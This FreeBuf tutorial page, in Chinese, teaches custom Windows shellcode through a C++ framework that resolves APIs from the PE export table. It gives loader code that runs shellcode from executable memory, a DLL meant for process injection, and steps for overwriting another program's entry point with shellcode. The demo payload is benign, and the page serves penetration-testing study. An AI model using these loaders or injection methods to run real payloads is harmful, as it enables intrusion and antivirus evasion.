[![freeBuf](/images/logoMax.png)](/)

主站

分类

漏洞  工具  极客  Web安全  系统安全  网络安全  无线安全  设备/客户端安全  数据安全  安全管理  企业安全  工控安全

特色

头条  人物志  活动  视频  观点  招聘  报告  资讯  区块链安全  标准与合规  容器安全  公开课

[报告](https://www.freebuf.com/report)

[专辑](/column)

  * ··· __

  * [招聘站](https://job.freebuf.com)
  * ··· __

  * [公开课](https://live.freebuf.com)
  * ··· __

  * 用户服务 __

  * ··· __

  * 企业服务 __

  * ··· __

行业专区

政 府

CNCERT  CNNVD

[ 云沙箱 ](https://sandbox.freebuf.com/detect?theme=freebuf)

__

[ 登录](https://www.freebuf.com/oauth)
[注册](https://account.tophant.com/register) 创作中心

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

Shellcode编程——编写自己想要功能的Shellcode

  * [![]() ]()
  * 关注 

  * [ Web安全 ](https://www.freebuf.com/articles/web)

__

__

__

__

__

__

__

Shellcode编程——编写自己想要功能的Shellcode

[__ ]() __2020-03-27 14:27:57 __

# 一、shellcode编程前置知识点介绍

## shellcode是什么？

shellcode的本质其实就是一段可以自主运行的汇编代码，它没有任何文件结构，它不依赖任何编译环境，无法像exe一样双击运行。具体的shellcode介绍大家可自行百度，我这里也就不啰嗦了。

## 为什么要自己编写shellcode？

因为最近半年做渗透比较多，使用的shellcode也都是CS或MSF生成的，但是工具自动生成的shellcode毕竟是死的，没办法自己扩展功能，再比如你知道一个新的漏洞，但是给的漏洞利用poc只能弹出个计算器，想要实现自己想要功能的shellcode就必须自己编写，因此掌握Shellcode编写技术就显得尤为重要，并且在缓冲区溢出和蠕虫病毒上面shellcode也是必不可少的重要角色。

## shellcode编写遇到的问题

想要自己编写shellcode，前提是必须知道shellcode编写中最重要的几个知识点，下面我会以问题的形式把需要解决的几个点列一下：

1.Shellcode也是一段程序，如果想正常运行也需要用到各种各样的数据（例如全局的字符串等），但是我们都知道全局变量的访问都是固定地址（硬编码，也就是写死的，没办法改变的），而我们的shellcode可能会被安排运行在任何程序的任何位置，我们要怎样保证shellcode在这种情况下还能准确无误的访问到所需的数据呢？

2.Shellcode也是运行在操作系统里的，必然需要调用一些系统的API，我们要怎样才能得到这些API的地址呢？

3.如果Shellcode运行的程序中没有导入我们所需的API，而我们又必须要使用它，我们该怎么办呢？

因为篇幅原因这些问题的答案大家可以从FB资深作者Rabbit_Run翻译的[《Windows平台shellcode开发入门一、二、三》](https://www.freebuf.com/author/Rabbit_Run)三篇文章中寻找寻找答案，基本上把shellcode编写需要了解的前置知识都涉及了，大家可以带着问题去寻找答案。

# 二、shellcode编程框架介绍

## shellcode编程框架：

在知道了这些前置知识之后大家如果纯手写shellcode的话还是比较麻烦和困难得，就像写原生的js代码远不如使用jquery等js框架方便且开发快速。所以我们要打造一套顺手的shellcode编程框架用来日后我们开发自己功能的shellcode。现在网上很多这种shellcode编程框架，比如TK以前开源的一款、OneBugMan老师以前写过的2款等等，我之前在学校学习的时候自己写过一个shellcode编程框架但是已经找不到了，而且搞渗透的这段时间以前的知识忘了很多了，所以就参照OneBugMan老师的课程（有兴趣的可以去支持一下老师讲的公开课，讲的很好）写了一个shellcode框架实践了一下。

## 框架结构介绍

![图片.png](https://image.3001.net/images/20200327/1585275287_5e7d61978b793.png!small)

图1 框架结构图  

本次工程创建是win32空项目，使用的是VS2015编译relase/x86，编译之前进行如下设置：

1.创建工程时关闭SDL检查

2.属性->C/C++->代码生成->运行库->多线程 (/MT)如果是debug则设置成MTD

3.属性->常规->平台工具集->设置为Visual Studio 2015- Windows XP
(v140_xp)，如果没有则可以去安装上对应的兼容xp的组件

4.属性->C/C++->代码生成->禁用安全检查GS

5.关闭生成清单 属性->链接器->清单文件->生成清单 选择否

下面介绍一下每个文件的作用：

1.api.h——>shellcode所用到系统函数的函数指针，以及一个结构体里面包含了这些函数指针。

2.header.h——>头文件及自定义功能函数的函数声明。

3.0.entry.cpp——>框架的入口，创建最后生成的shellcode文件。

4.a.start.cpp——>标记shellcode的开始位置，用来进行shellcode编写前的前置操作和所用到函数的初始化

5.b.work.cpp——>shellcode的执行，具体功能的实现

6.z.end.cpp——>标记shellcode结束位置

之所以文件命名的形式按照这种方式命名是因为按照先数字再字母，按照前后排列的形式，工程内文件这样命名是为了编译生成exe的时候就是按照下图顺序编译生成的，这样生成的exe代码段中函数排列顺序也是按照下图文件中函数顺序排列的，这样我们可以很方便的计算出Shellcode的大小（z.end中的ShellcodeEnd
减去a.start.中的ShellcodeStart就是shellcode的大小），从而把shellcode写入最后生成的文件中。

![图片.png](https://image.3001.net/images/20200327/1585277194_5e7d690abb827.png!small)
图2 编译顺序图

## 代码详细讲解

0.entry.cpp中主要注意的就是修改函数入口点的名称一定要和自己写的函数名称一致，否则找不到入口点，因为我们修改了入口点所以一些C形式的函数不能直接使用了，要改为动态调用的形式，还有就是我们写入shellcode大小的计算。

![图片.png](https://image.3001.net/images/20200327/1585277637_5e7d6ac51c920.png!small)

图3 0.entry.cpp代码  

a.start.cpp中主要是实现了编写shellcode最重要的几个前置准备：动态获取kernel32.dll的基质和利用PE文件格式的知识来获取GetProcAddress函数地址，进一步获取LoadLibrary地址，有了这些前置步骤我们才能获取其他任意API的地址，进而实现我们shellcode的各种功能

![图片.png](https://image.3001.net/images/20200327/1585277967_5e7d6c0f71817.png!small)
图4 获取kernel32.dll基地址

下面是获取GetProcAddress函数地址，之所以GetProcAddress字符串要以下图那种写法是因为如果使用这样写法char
str[]="xxxxx";这样会把字符串写到程序中的rdata段，就变成了绝对地址，使用绝对地址会使shellcode执行错误。

    
    
    FARPROC getProcAddress(HMODULE hModuleBase)
    {
        FARPROC pRet = NULL;
        PIMAGE_DOS_HEADER lpDosHeader;
        PIMAGE_NT_HEADERS32 lpNtHeaders;
        PIMAGE_EXPORT_DIRECTORY lpExports;
        PWORD lpwOrd;
        PDWORD lpdwFunName;
        PDWORD lpdwFunAddr;
        DWORD dwLoop;
    
        lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;
        lpNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader->e_lfanew);
        if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)
        {
            return pRet;
        }
        if (!lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        {
            return pRet;
        }
        lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (!lpExports->NumberOfNames)
        {
            return pRet;
        }
        lpdwFunName = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNames);
        lpwOrd = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfNameOrdinals);
        lpdwFunAddr = (PDWORD)((DWORD)hModuleBase + (DWORD)lpExports->AddressOfFunctions);
        for (dwLoop = 0; dwLoop <= lpExports->NumberOfNames - 1; dwLoop++)
        {
            char * pszFunction = (char*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);
            if (pszFunction[0] == 'G'
                &&pszFunction;[1] == 'e'
                &&pszFunction;[2] == 't'
                &&pszFunction;[3] == 'P'
                &&pszFunction;[4] == 'r'
                &&pszFunction;[5] == 'o'
                &&pszFunction;[6] == 'c'
                &&pszFunction;[7] == 'A'
                &&pszFunction;[8] == 'd'
                &&pszFunction;[9] == 'd'
                &&pszFunction;[10] == 'r'
                &&pszFunction;[11] == 'e'
                &&pszFunction;[12] == 's'
                &&pszFunction;[13] == 's')
            {
                pRet = (FARPROC)(lpdwFunAddr[lpwOrd[dwLoop]] + (DWORD)hModuleBase);
                break;
            }
        }
        return pRet;
    }
    

#####
下面的初始化函数部分我们要知道我们使用的函数在哪个dll中，比如我们想要使用system()函数执行命令，我们就要通过下图方式先载入msvCRT.dll,然后再通过getprocaddress函数找到system函数。别忘记system函数中所用的命令字符串（例如调用计算器）也要像char
szCalc[] = { 'c','a','l','c',0
};这样写。![图片.png](https://image.3001.net/images/20200327/1585285571_5e7d89c31d1fb.png!small)
图5 初始化函数

具体功能实现时只需要记住要将函数内所用到的字符串按照下图数组方式声明即可，这里我们写了示例的功能为 弹出一个消息框
提示hello,然后创建一个1.txt文档。

![图片.png](https://image.3001.net/images/20200327/1585285833_5e7d8ac907d94.png!small)

图 6 b.work.cpp具体功能实现  

# 三、执行shellcode

框架代码写好之后，我们运行一下会在项目目录里面生成一个sc.bin文件，这个文件中我们使用010Editor打开sc.bin即可看到生成的shellcode。

![图片.png](https://image.3001.net/images/20200327/1585286717_5e7d8e3db7a9c.png!small)
图7 生成的shellcode

## 下面介绍几种shellcode运行方式：

### 1、（使用010Editor直接复制出来shellcode）直接替换某程序的二进制

例如我们想让dbgview.exe运行我们生成的shellcode

第一步：我们使用lordPE查看dbgview.exe程序的入口点。

![图片.png](https://image.3001.net/images/20200327/1585287126_5e7d8fd6314e1.png!small)

然后使用010Editor打开dbgview.exe找到入口点位置，从入口点位置删除掉我们需要替换进去的shellcode大小的字节，然后替换成我们的shellcode，保存运行即可执行我们的shellcode。

### 2、把shellcode直接写到代码中生成exe程序运行（源码A）、或者生成dll再写注入器或者使用工具注入到某进程中（源码B）

源码A

    
    
    #include <windows.h>
    #include <stdio.h>
    #pragma comment(linker, "/section:.data,RWE")
    unsigned char shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89........在这里写入shellcode";
    void main()
    {
        __asm
        {
            mov eax, offset shellcode
            jmp eax
        }
    }
    

源码B

    
    
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "stdafx.h"
    #include<windows.h>
    #include<iostream>
    //data段可读写
    #pragma comment(linker, "/section:.data,RWE") 
    HANDLE My_hThread = NULL;
    //void(*ptrceshi)() = NULL;
    typedef void(__stdcall *CODE) ();
    unsigned char shellcode[] = "x00\x49\xbe\x77\x69\x6e\x.........在这里填入shellcode";
    DWORD  WINAPI ceshi(LPVOID pParameter)
    {
        PVOID p = NULL;
        if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
        {
        }
            if (!(memcpy(p, shellcode, sizeof(shellcode))))
            {
            }
        CODE code = (CODE)p;
        code();
        return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            My_hThread = ::CreateThread(NULL, 0, &ceshi;, 0, 0, 0);//新建线程
        case DLL_THREAD_ATTACH:
    
        case DLL_THREAD_DETACH:
    
        case DLL_PROCESS_DETACH:
    
            break;
        }
        return TRUE;
    }
    

#####
具体操作可以参考我发的上篇文章[]()[《shellcode免杀实战里面的步骤》](https://www.freebuf.com/articles/system/228233.html)。

### 3、自己写加载器

我们如果不想复制出来shellcode运行我们也可以直接运行我们生成的sc.bin，不过得需要自己写一个加载器。

代码如下

    
    
    #include<stdio.h>
    #include<stdlib.h>
    #include<windows.h>
    int main(int argc, char* argv[])
    {
        HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("Open  File Error!%d\n", GetLastError());
            return -1;
        }
        DWORD dwSize;
        dwSize = GetFileSize(hFile, NULL);
    
        LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (lpAddress == NULL)
        {
            printf("VirtualAlloc error:%d\n", GetLastError());
            CloseHandle(hFile);
            return -1;
    
        }
        DWORD dwRead;
        ReadFile(hFile, lpAddress, dwSize, &dwRead;, 0);
        __asm
        {
            call lpAddress;
    
        }
        _flushall();
        system("pause");
        return 0;
    }
    

写好加载器编译生成exe以后我们只需要把sc.bin文件拖到生成的exe上就可以自动运行我们的shellcode，或者使用命令行 >某某.exe
sc.bin

### 4、使用别人写好的加载器

如果大家不想自己写加载器也可以使用别人写好的工具，我以前在看雪上发现一个小工具也挺好用的，这个小工具可以把shellcode转换成字符串形式也可以将字符串形式的shellcode转换成bin文件形式然后再加载运行shellcode。

原帖子链接[工具链接](https://bbs.pediy.com/thread-182209.htm)

我们就拿这个工具执行一下我们生成的sc.bin，将sc.bin拖入工具中，我们可以点击转成字符串形式

![图片.png](https://image.3001.net/images/20200327/1585288115_5e7d93b39dd71.png!small)

这和我们在010Editor中看到的是一样的，相当于帮我们自动复制出来了。

![图片.png](https://image.3001.net/images/20200327/1585288159_5e7d93df59b7b.png!small)

因为我们生成的sc.bin文件是可以直接执行的，所以就不需要点击转成Bin文件了，所以我们直接点击执行shellcode，弹出了Messagebox窗口，我们点击确定后，又创建了1.txt文档。

![图片.png](https://image.3001.net/images/20200327/1585288276_5e7d9454758c3.png!small)

![图片.png](https://image.3001.net/images/20200327/1585288314_5e7d947ae1bc8.png!small)至此我们就可以根据框架举一反三，编写我们自己功能的shellcode了。

# 四、小结

框架源码及加载器源码还有看雪加载器工具我已经放入网盘中了，大家有需要的可以下载使用。在此感谢OneBugMan老师的课程和看雪岭南散人分享的加载器工具。

网盘链接：<https://pan.baidu.com/s/107Vm__jpvMIkCZGYu2l5gg> 提取码：tf3e

# 关注我们

Tide安全团队正式成立于2019年1月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，目前聚集了十多位专业的安全攻防技术研究人员，专注于网络攻防、Web安全、移动终端、安全开发、IoT/物联网/工控安全等方向。

想了解更多Tide安全团队，请关注团队官网: [http://www.TideSec.com](http://www.tidesec.com/)
或长按二维码关注公众号：

![ewm.png](https://image.3001.net/images/20200203/1580733098_5e3812aaa6af0.png!small)

本文作者：， 转载请注明来自[FreeBuf.COM](https://www.freebuf.com)

__ # shellcode __ # 编程

被以下专辑收录，发现更多精彩内容

\+ 收入我的专辑

展开更多 __

评论 __按热度排序

![](https://image.3001.net/images/index/wp-user-avatar-50x50.png)

请登录/注册后在FreeBuf发布内容哦

相关推荐

![]()\

关 注

  * 0 文章数
  * 0 评论数
  * 0 关注者

请 [登录](https://www.freebuf.com/oauth) /
[注册](https://account.tophant.com/register.html)后在FreeBuf发布内容哦

__ 收入专辑

__

分享文章

分享到微信

分享到微博

分享到QQ

复制链接

收藏文章

匿名  发 表 取 消 有人回复时邮件通知我

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

[FreeBuf社群入口](https://www.freebuf.com/articles/others-articles/247797.html)

### 用户服务

  * [有奖投稿](https://www.freebuf.com/write)
  * [提交漏洞](https://www.vulbox.com/bounties/detail-72)
  * [参与众测](https://www.vulbox.com/projects/list)
  * [商城](https://shop.freebuf.com)

### 企业服务

  * [企业空间](https://company.freebuf.com)
  * [企业SRC](https://www.vulbox.com/service/src)
  * [漏洞众测](https://www.vulbox.com/)
  * [威胁检测](https://www.riskivy.com/)

### 合作信息

  * [寻求服务](http://freebuf2019.mikecrm.com/B9fQZDt)
  * [广告投放](https://www.freebuf.com/advertise)
  * [联系我们](mailto:help@freebuf.com)
  * [友情链接](https://www.freebuf.com/friends)

### 关于我们

  * [关于我们](https://www.freebuf.com/news/others/864.html)
  * [加入我们](https://www.freebuf.com/jobs/40386.html)
  * [微信公众号](javascript:;)

  * [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

  * [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)
  * [![](https://image.3001.net/images/20191017/1571310907_5da84d3bbdf2c.png)](http://www.upyun.com/?freebuf)
  * [![](https://image.3001.net/images/20191017/1571306606_5da83c6e8de1c.png)](https://www.trustasia.com/?freebuf)

### FreeBuf+小程序

![](/images/xcx-code.png)

扫码把安全装进口袋

  * [斗象科技](https://www.tophant.com/)
  * [FreeBuf](https://www.freebuf.com)
  * [漏洞盒子](https://www.vulbox.com/)
  * [斗象智能安全平台](https://www.riskivy.com/)
  * [免责条款](https://www.freebuf.com/dis)
  * [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2020 WWW.FREEBUF.COM All Rights Reserved [ 沪ICP备13033796号
](https://beian.miit.gov.cn/#/Integrated/index) | [ 沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)

